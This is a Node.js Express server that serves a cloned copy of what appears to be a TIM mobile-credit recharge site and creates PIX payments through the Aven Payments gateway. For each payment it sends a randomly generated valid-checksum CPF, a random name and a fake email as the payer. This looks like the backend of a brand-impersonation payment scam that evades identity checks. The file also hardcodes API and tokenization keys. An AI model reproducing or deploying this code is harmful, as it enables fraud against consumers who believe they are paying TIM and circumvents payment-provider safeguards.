require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the tim-credito.vercel.app directory
app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));

const AVEN_API_KEY = process.env.AVEN_API_KEY || '7obEdFjeJxUiaOd1wuo8bt7QcjHS3LPJOj9ANVHHoFU';
const AVEN_TOKENIZATION_KEY = process.env.AVEN_TOKENIZATION_KEY || '1ABcTMX2IN0JtveSRPqfbJFz0NH2XGZ9LmQg7Lr_NEE';
const AVEN_BASE_URL = 'https://api.avenpayments.com/v1';

// Gera um CPF válido aleatório
function generateCPF() {
    const rand = () => Math.floor(Math.random() * 9);
    let n = Array.from({ length: 9 }, rand);

    // Calcula 1º dígito verificador
    let sum = n.reduce((acc, val, i) => acc + val * (10 - i), 0);
    let d1 = 11 - (sum % 11);
    if (d1 >= 10) d1 = 0;

    // Calcula 2º dígito verificador
    n.push(d1);
    sum = n.reduce((acc, val, i) => acc + val * (11 - i), 0);
    let d2 = 11 - (sum % 11);
    if (d2 >= 10) d2 = 0;

    n.push(d2);
    return n.join('');
}

// Controle de tentativas de PIX por telefone
// Estrutura: { phone: { count: N, name: str|null, email: str|null } }
const pixAttempts = new Map();
const MAX_PIX_ATTEMPTS = 3;

// Retorna configurações públicas (ex: chave de tokenização)
app.get('/api/config', (req, res) => {
    res.json({
        tokenizationKey: AVEN_TOKENIZATION_KEY
    });
});

app.post('/api/pix', async (req, res) => {
    try {
        const { value, phone } = req.body;
        
        // Convert value string like "20,00" or "24,90" to integer in cents (e.g. 2000, 2490)
        let amountInCents = 2000; // default 20.00
        if (value) {
            const cleanValue = value.replace('R$', '').trim().replace(',', '.');
            amountInCents = Math.round(parseFloat(cleanValue) * 100);
        }

        const cleanPhone = phone ? phone.replace(/\D/g, '') : '11999999999';

        // --- Bloqueio por tentativas ---
        const attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };

        if (attempt.count >= MAX_PIX_ATTEMPTS) {
            console.warn(`[BLOQUEADO] Telefone ${cleanPhone} atingiu ${MAX_PIX_ATTEMPTS} tentativas de PIX sem pagamento.`);
            return res.status(429).json({
                success: false,
                blocked: true,
                message: 'Limite de tentativas atingido. Entre em contato com o suporte.'
            });
        }

        // Incrementa contador ANTES de chamar a API
        attempt.count += 1;
        pixAttempts.set(cleanPhone, attempt);
        console.log(`[PIX] Telefone ${cleanPhone} — tentativa ${attempt.count}/${MAX_PIX_ATTEMPTS}`);
        // --------------------------------

        const cleanCpf = generateCPF();
        
        // Reutiliza nome/email se o lead já gerou um PIX antes, senão gera novo e salva
        const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Lucas', 'Julia', 'Marcos', 'Fernanda', 'Carlos', 'Beatriz', 'Rafael', 'Amanda', 'Gabriel', 'Camila'];
        const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho'];

        let fullName, randomEmail;
        if (attempt.name && attempt.email) {
            // Lead já conhecido — reutiliza identidade
            fullName = attempt.name;
            randomEmail = attempt.email;
            console.log(`[PIX] Reutilizando identidade para ${cleanPhone}: ${fullName}`);
        } else {
            // Primeiro PIX — gera e salva identidade
            const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
            const randomLastName  = lastNames[Math.floor(Math.random() * lastNames.length)];
            fullName      = `${randomFirstName} ${randomLastName}`;
            randomEmail   = `${randomFirstName.toLowerCase()}.${randomLastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
            attempt.name  = fullName;
            attempt.email = randomEmail;
            pixAttempts.set(cleanPhone, attempt);
            console.log(`[PIX] Nova identidade gerada para ${cleanPhone}: ${fullName}`);
        }

        const externalRef = `tim_${Date.now()}_${Math.floor(Math.random() * 10000)}`;

        const payload = {
            amount: amountInCents,
            currency: 'BRL',
            method: 'PIX',
            description: 'Recarga TIM',
            externalRef: externalRef,
            payer: {
                name: fullName,
                taxId: cleanCpf,
                email: randomEmail,
                phone: cleanPhone
            },
            items: [
                {
                    quantity: 1,
                    name: 'Recarga TIM',
                    price: amountInCents,
                    type: 'DIGITAL'
                }
            ]
        };

        const response = await fetch(`${AVEN_BASE_URL}/payment`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${AVEN_API_KEY}`
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();

        if (response.ok && data?.id) {
            console.log('[AVEN] Pagamento PIX criado com sucesso:', data.id);
            const copypaste = data.data?.copypaste || '';
            const qrCodeUrl = copypaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copypaste)}` : '';

            res.json({
                success: true,
                data: {
                    transactionId: data.id,
                    status: data.status,
                    paymentData: {
                        copyPaste: copypaste,
                        qrCode: copypaste,
                        copypaste: copypaste,
                        qrCodeUrl: qrCodeUrl
                    },
                    aven: data
                }
            });
        } else {
            console.error('[AVEN] Erro ao criar PIX:', data);
            res.status(response.status || 400).json({
                success: false,
                message: data?.message || 'Erro ao processar pagamento na Aven',
                details: data
            });
        }

    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Check payment status
app.get('/api/status/:transactionId', async (req, res) => {
    try {
        const { transactionId } = req.params;
        const { phone } = req.query; // opcional: ?phone=11999999999
        
        const response = await fetch(`${AVEN_BASE_URL}/payment/${transactionId}`, {
            headers: {
                'Authorization': `Bearer ${AVEN_API_KEY}`
            }
        });
        const data = await response.json();
        console.log(`[AVEN] Status check para ${transactionId}:`, data?.status);

        // Se pagamento confirmado, remove o bloqueio do telefone
        if ((data?.status === 'PAID' || data?.data?.status === 'PAID') && phone) {
            const cleanPhone = phone.replace(/\D/g, '');
            pixAttempts.delete(cleanPhone);
            console.log(`[DESBLOQUEADO] Pagamento confirmado — telefone ${cleanPhone} liberado.`);
        }

        res.json({
            success: response.ok,
            data: {
                status: data.status,
                id: data.id,
                ...data
            }
        });
    } catch (error) {
        console.error('Status check error:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Check status para compatibilidade com transitions.js
app.get('/api/check_status', async (req, res) => {
    try {
        const transactionId = req.query.id;
        if (!transactionId) {
            return res.status(400).json({ success: false, message: 'Missing transaction id' });
        }
        const response = await fetch(`${AVEN_BASE_URL}/payment/${transactionId}`, {
            headers: {
                'Authorization': `Bearer ${AVEN_API_KEY}`
            }
        });
        const data = await response.json();
        const isPaid = data.status === 'PAID';
        res.json({
            status: isPaid ? 'approved' : (data.status || 'pending'),
            data: data
        });
    } catch (error) {
        console.error('Check status error:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Fallback to index.html for other routes
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'tim-credito.vercel.app', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Gateway configurado: Aven Payments`);
    console.log(`Acesse: http://localhost:${PORT}`);
});
